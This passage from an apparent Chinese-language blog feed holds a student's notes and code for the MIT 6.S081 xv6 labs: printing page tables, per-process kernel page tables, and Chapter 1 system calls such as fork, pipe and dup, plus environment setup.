class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 2^9 PTEs in a page table</span></span><br><span class="line"><span class="keyword">pte_t</span> pte = pagetable[i];</span><br><span class="line"><span class="keyword">if</span> (pte &amp; PTE_V)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= deep; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;.. &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: pte %p pa %p\n&quot;</span>, i, pte, PTE2PA(pte));</span><br><span class="line"><span class="keyword">if</span> ((pte &amp; (PTE_R | PTE_W | PTE_X)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// this PTE points to a lower-level page table.</span></span><br><span class="line">uint64 child = PTE2PA(pte);</span><br><span class="line">vmprintwalk((<span class="keyword">pagetable_t</span>)child, deep + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprint</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>, pagetable);</span><br><span class="line">vmprintwalk(pagetable, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2022/07/10/2022-7-10-oslab/image-20220721150757704.png" alt="image-20220721150757704"></p><h2 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h2><blockquote><p>  Xv6有一个单独的内核页表，每当它在内核中执行时都会使用它。内核页表是物理地址的直接映射，因此内核虚拟地址x映射到物理地址x。Xv6还为每个进程的用户地址空间提供了一个单独的页表，仅包含该进程用户内存的映射，从虚拟地址零开始。因为内核页表不包含这些映射，所以用户地址在内核中无效。因此，当内核需要使用在系统调用中传递的用户指针（例如，传递给write()的缓冲区指针）时，内核必须首先将指针转换为物理地址。本节和下一节的目标是允许内核直接解引用用户指针。</p><p>  您的第一项工作是修改内核，使每个进程在内核中执行时都使用自己的内核页表副本。修改struct proc以维护每个进程的内核页表，并修改调度器以在切换进程时切换内核页表。对于这一步，每个进程内核页表应该与现有的全局内核页表相同。如果usertests运行正确，则通过这部分实验室。</p></blockquote><p>本 Lab 目标是让每一个进程进入内核态后，都能有自己的独立<strong>内核页表</strong>，为第三个实验做准备。</p><ul><li><p>在进程结构体proc中加kernelpgtbl字段，用于存储进程专享的内核态页表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.h</span></span><br><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span> <span class="comment">// Process state</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>  <span class="comment">// Parent process</span></span><br><span class="line">  <span class="keyword">void</span> *chan;           <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="keyword">int</span> killed;           <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="keyword">int</span> xstate;           <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="keyword">int</span> pid;              <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> kernelPageTable; <span class="comment">// Kernel page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>之后是初始化这个<code>kernelPageTable</code>字段，仿<code>kernel/vm.c</code>里<code>kvminit</code>函数，用内核自己pagetable初始化的方式初始化用户进程的<code>kernel pagetable</code>，其中<code>uvmmap</code>类似于<code>kvmmap</code>，只不过<code>kvmmap</code>是直接对全局的<code>kernel_pagetable</code>进行<code>mappage</code>，而<code>uvmmap</code>并没有指定page table</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pagetable_t</span> <span class="title">proc_kvminit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// kernel_pagetable = (pagetable_t)kalloc();</span></span><br><span class="line"><span class="comment">// memset(kernel_pagetable, 0, PGSIZE);</span></span><br><span class="line"><span class="keyword">pagetable_t</span> kernelPageTable;</span><br><span class="line">kernelPageTable = uvmcreate();</span><br><span class="line"><span class="keyword">if</span> (kernelPageTable == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">uvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">uvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">uvmmap(CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line">uvmmap(PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line">uvmmap(KERNBASE, KERNBASE, (uint64)etext - KERNBASE, PTE_R | PTE_X);</span><br><span class="line">uvmmap((uint64)etext, (uint64)etext, PHYSTOP - (uint64)etext, PTE_R | PTE_W);</span><br><span class="line">uvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line"><span class="keyword">return</span> kernelPageTable;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uvmmap</span><span class="params">(uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (mappages(kernel_pagetable, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;uvmmap&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在defs.h加声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pagetable_t</span>     <span class="title">proc_kvminit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>在<code>kernel/proc.c</code>中的<code>allocproc</code>函数中添加调用<code>proc_kvminit()</code>的代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;kernelPageTable = proc_kvminit();</span><br><span class="line"><span class="keyword">if</span> (p-&gt;kernelPageTable == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">freeproc(p);</span><br><span class="line">release(&amp;p-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接下来是初始化内核栈，内核栈的初始化原来是在 <code>kernel/proc.c</code> 中的 <code>procinit</code> 函数内，这部分要求将函数内的代码转移到 <code>allocproc</code> 函数内，因此在上一步初始化内核态页表的代码下面接着添加初始化内核栈的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;kernelPageTable = proc_kvminit();</span><br><span class="line"><span class="keyword">if</span> (p-&gt;kernelPageTable == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">freeproc(p);</span><br><span class="line">release(&amp;p-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 初始化内核栈</span></span><br><span class="line"><span class="keyword">char</span> *pa = kalloc();</span><br><span class="line"><span class="keyword">if</span> (pa == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">uint64 va = KSTACK((<span class="keyword">int</span>)(p - proc));</span><br><span class="line">uvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">p-&gt;kstack = va;</span><br></pre></td></tr></table></figure></li><li><p>进程调度时，切换内核页：内核页的管理使用的是 SATP 寄存器，在 <code>kernel/proc.c</code> 的调度函数 <code>scheduler</code> 中添加切换 SATP 寄存器的代码，并在调度后切换回来, <code>w_satp()</code> 函数用于设置最高级页目录地址的寄存器 SATP, <code>sfence_vam()</code> 用于清空当前 TLB.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// change satp</span></span><br><span class="line">w_satp(MAKE_SATP(p-&gt;kernelPageTable));</span><br><span class="line">sfence_vma();</span><br><span class="line"><span class="comment">// change process</span></span><br><span class="line">swtch(&amp;c-&gt;context, &amp;p-&gt;context);</span><br><span class="line"><span class="comment">// change back</span></span><br><span class="line">kvminithart();</span><br></pre></td></tr></table></figure></li><li><p>释放内核页表：直接遍历所有的页表，释放所有有效的页表项即可。仿照 <code>freewalk</code> 函数。仅释放页表的映射关系即可，不能将真实的物理地址也释放了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">proc_freewalk</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// there are 2^9 = 512 PTEs in a page table.</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">pte_t</span> pte = pagetable[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte &amp; PTE_V)</span><br><span class="line">&#123;</span><br><span class="line">pagetable[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ((pte &amp; PTE_V) &amp;&amp; (pte &amp; (PTE_R | PTE_W | PTE_X)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// this PTE points to a lower-level page table.</span></span><br><span class="line">uint64 child = PTE2PA(pte);</span><br><span class="line">proc_freewalk((<span class="keyword">pagetable_t</span>)child);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kfree((<span class="keyword">void</span> *)pagetable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>freeproc()</code> 代码如下, 还需注意的一点是, 内核栈 <code>p-&gt;stack</code> 需要在内核页表 <code>p-&gt;kpagetable</code> 之前清除.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freeproc</span><span class="params">(struct proc *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;trapframe)</span><br><span class="line">kfree((<span class="keyword">void</span> *)p-&gt;trapframe);</span><br><span class="line">p-&gt;trapframe = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;pagetable)</span><br><span class="line">proc_freepagetable(p-&gt;pagetable, p-&gt;sz);</span><br><span class="line">p-&gt;pagetable = <span class="number">0</span>;</span><br><span class="line">p-&gt;sz = <span class="number">0</span>;</span><br><span class="line">p-&gt;pid = <span class="number">0</span>;</span><br><span class="line">p-&gt;parent = <span class="number">0</span>;</span><br><span class="line">p-&gt;name[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p-&gt;chan = <span class="number">0</span>;</span><br><span class="line">p-&gt;killed = <span class="number">0</span>;</span><br><span class="line">p-&gt;xstate = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// free kernel stack</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;kstack)</span><br><span class="line">uvmunmap(p-&gt;kernelPageTable, p-&gt;kstack, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">p-&gt;kstack = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;kernelPageTable)</span><br><span class="line">proc_freewalk(p-&gt;kernelPageTable);</span><br><span class="line">p-&gt;kernelPageTable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">p-&gt;state = UNUSED;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>在 vm.c 中添加头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;proc.h&quot;</span></span></span><br></pre></td></tr></table></figure></li><li><p><code>kvmpa()</code> 函数用于将内核虚拟地址转换为物理地址, 其中调用 <code>walk()</code> 函数时使用了全局的内核页表. 此时需要换位当前进程的内核页表. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">kvmpa</span><span class="params">(uint64 va)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint64 off = va % PGSIZE;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line">uint64 pa;</span><br><span class="line"></span><br><span class="line">pte = walk(myproc()-&gt;kernelPageTable, va, <span class="number">0</span>);<span class="comment">//here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kvmpa&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kvmpa&quot;</span>);</span><br><span class="line">pa = PTE2PA(*pte);</span><br><span class="line"><span class="keyword">return</span> pa + off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写oslab的一些代码，&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;  xv6中文文档：&lt;a href=&quot;https://th0ar.gitbooks.io/xv6-chinese/content/content/chapter2.html&quot;&gt;https://th0ar.gi</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="OS" scheme="https://ghostasky.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.S081_Note</title>
    <link href="https://ghostasky.github.io/2022/07/07/6.s081/"/>
    <id>https://ghostasky.github.io/2022/07/07/6.s081/</id>
    <published>2022-07-06T16:00:00.000Z</published>
    <updated>2022-07-21T06:01:55.089Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><blockquote><p>  6.s081看的是文档（比较快些），没看视频，：<a href="https://github.com/Ghostasky/MIT6.S081">https://github.com/Ghostasky/MIT6.S081</a></p><p>  XV6:<a href="https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf">https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf</a></p></blockquote><p>有一说一，这课是真他娘好看，就按照章节顺序来做笔记吧。</p><blockquote><p>  上次没看完，，，这个暑假搞完，，，，</p></blockquote><h1 id="Chapter1"><a href="#Chapter1" class="headerlink" title="Chapter1"></a>Chapter1</h1><h2 id="6-s081"><a href="#6-s081" class="headerlink" title="6.s081"></a>6.s081</h2><p>操作系统的目标：</p><ol><li>抽象硬件(Abstraction)。对CPU，内存这些，使用应用程序实现高层级的接口和抽象，例如进程，文件系统。</li><li>多个应用程序之间共用硬件资源(multiplex)。</li><li>隔离性(Isolation)：多个程序之间互不干扰</li><li>共享(Sharing)：数据交互，协同完成任务等</li><li>Security(或者Permission System或者是Access Control System)</li><li>高性能(Performance)</li><li>支持大量不同类型的程序</li></ol><h3 id="操作系统结构"><a href="#操作系统结构" class="headerlink" title="操作系统结构"></a>操作系统结构</h3><p>在这门课程中，我们主要关注点在Kernel、连接Kernel和用户空间程序的接口、Kernel内软件的架构；会关心Kernel中的服务，其中一个服务是文件系统，另一个就是进程管理系统。</p><p>每一个用户空间程序都被称为一个进程，它们有自己的内存和共享的CPU时间。</p><p>应用程序是与Kernel交互通过系统调用实现。</p><p><code>fork()：创建了一个与调用进程一模一样的新的进程，并返回新进程的process ID/pid</code></p><p>当程序员在写普通的应用程序时，应用程序下面都是操作系统。而当我们在构建操作系统时，在操作系统下面就是硬件了，这些硬件通常会更难处理。在这门课程中，我们会使用一个叫做QEMU的硬件模拟器，来模拟CPU和计算机。</p><h3 id="read-write-exit系统调用"><a href="#read-write-exit系统调用" class="headerlink" title="read,write,exit系统调用"></a>read,write,exit系统调用</h3><p>以下都使用XV6，XV6运行在一个RISC-V微处理器上，会在一个QEMU模拟器上运行XV6。</p><p>首先是copy程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n = read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        write(<span class="number">1</span>, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意在Makefile里面：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">$U/_cat\</span><br><span class="line">$U/_echo\</span><br><span class="line">$U/_forktest\</span><br><span class="line">$U/_grep\</span><br><span class="line">$U/_init\</span><br><span class="line">$U/_kill\</span><br><span class="line">$U/_ln\</span><br><span class="line">$U/_ls\</span><br><span class="line">$U/_mkdir\</span><br><span class="line">$U/_rm\</span><br><span class="line">$U/_sh\</span><br><span class="line">$U/_stressfs\</span><br><span class="line">$U/_usertests\</span><br><span class="line">$U/_grind\</span><br><span class="line">$U/_wc\</span><br><span class="line">$U/_zombie\</span><br><span class="line">$U/_copy</span><br></pre></td></tr></table></figure><p>read系统调用：</p><ol><li>第一个参数为文件描述符，文件描述符0连接到console的输入，文件描述符1连接到了console的输出。</li><li>第二个参数是指向某段内存的指针</li><li>第三个参数是代码想读取的最大长度</li></ol><p>grep x会搜索输入中包含x的行，我可以告诉shell将输入重定向到文件out，这样我们就可以查看out中的x。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grep a &lt;out</span><br><span class="line">xargstest.sh   2 3 93</span><br><span class="line">cat            2 4 23968</span><br></pre></td></tr></table></figure><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>依据官网：<a href="https://pdos.csail.mit.edu/6.828/2020/tools.html">https://pdos.csail.mit.edu/6.828/2020/tools.html</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</span><br><span class="line">sudo apt-get remove qemu-system-misc</span><br><span class="line">sudo apt-get install qemu-system-misc=1:4.2-3ubuntu6</span><br><span class="line">git <span class="built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2020</span><br><span class="line"><span class="built_in">cd</span> xv6-labs-2020</span><br><span class="line">git checkout util</span><br><span class="line">sudo make qemu</span><br></pre></td></tr></table></figure><p>test:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>:</span><br><span class="line">$ riscv64-unknown-elf-gcc --version</span><br><span class="line">riscv64-unknown-elf-gcc (GCC) 10.1.0</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ qemu-system-riscv64 --version</span><br><span class="line">QEMU emulator version 5.1.0</span><br><span class="line"><span class="comment"># in the xv6 directory</span></span><br><span class="line">$ make qemu</span><br><span class="line"><span class="comment"># ... lots of output ...</span></span><br><span class="line">init: starting sh</span><br><span class="line">$</span><br><span class="line"><span class="comment">#success</span></span><br></pre></td></tr></table></figure><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line"> pid = fork();</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;fork return %d\n&quot;</span>,pid);</span><br><span class="line"> <span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;child\n&quot;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;father\n&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ ./a</span><br><span class="line">fork <span class="built_in">return</span> 67703</span><br><span class="line">father</span><br><span class="line">fork <span class="built_in">return</span> 0</span><br><span class="line">child</span><br></pre></td></tr></table></figure><p>fork系统调用在两个进程中都会返回，在原始的进程中，fork系统调用会返回大于0的整数，这个是新创建进程的ID。而在新创建的进程中，fork系统调用会返回0。所以即使两个进程的内存是完全一样的，我们还是可以通过fork的返回值区分旧进程和新进程。</p><p>父子进程拥有不同的内存空间和寄存器，改变一个进程中的变量不会影响另一个进程。</p><h3 id="close"><a href="#close" class="headerlink" title="close"></a>close</h3><p>形式是<code>int close(int fd)</code>，将打开的文件<code>fd</code>释放，使该文件描述符可以被后面的<code>open</code>、<code>pipe</code>等其他system call使用。</p><h3 id="dup"><a href="#dup" class="headerlink" title="dup"></a>dup</h3><p><code>dup</code>。形式是<code>int dup(int fd)</code>，复制一个新的<code>fd</code>指向的I&#x2F;O对象，返回这个新fd值，两个I&#x2F;O对象(文件)的offset相同</p><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><p>管道，暴露给进程的一对文件描述符，一个文件描述符用来读，另一个文件描述符用来写，将数据从管道的一端写入，将使其能够被从管道的另一端读出,管道的行为是<strong>FIFO</strong>（先进先出）</p><p><code>pipe</code>是一个system call，形式为<code>int pipe(int p[])</code>，<code>p[0]</code>为读取的文件描述符，<code>p[1]</code>为写入的文件描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 